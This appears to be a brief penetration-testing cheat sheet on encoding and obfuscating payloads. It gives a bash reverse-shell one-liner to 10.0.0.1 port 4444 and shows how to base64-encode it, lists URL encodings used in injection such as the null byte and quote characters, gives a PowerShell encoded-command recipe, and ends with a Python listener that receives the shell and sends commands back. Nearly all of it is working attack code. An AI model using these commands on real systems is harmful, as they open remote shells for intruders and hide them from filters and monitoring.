# Payload Encoding & Obfuscation

## Base64
```bash
# Encode
echo -n 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | base64

# Decode
echo 'BASE64STRING' | base64 -d
```

## URL Encoding
```bash
%20 = space
%00 = null byte
%0a = line feed
%27 = single quote
%22 = double quote
```

## PowerShell Encoded Command
```powershell
$command = 'Write-Host "Hello World"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded
```

## Python Listener
```python
python3 -c "
import socket
s = socket.socket()
s.bind(('0.0.0.0', 4444))
s.listen(1)
conn, addr = s.accept()
while True:
    data = conn.recv(1024)
    if not data: break
    print(data.decode(), end='')
    cmd = input()
    conn.send((cmd + '\n').encode())
"
```
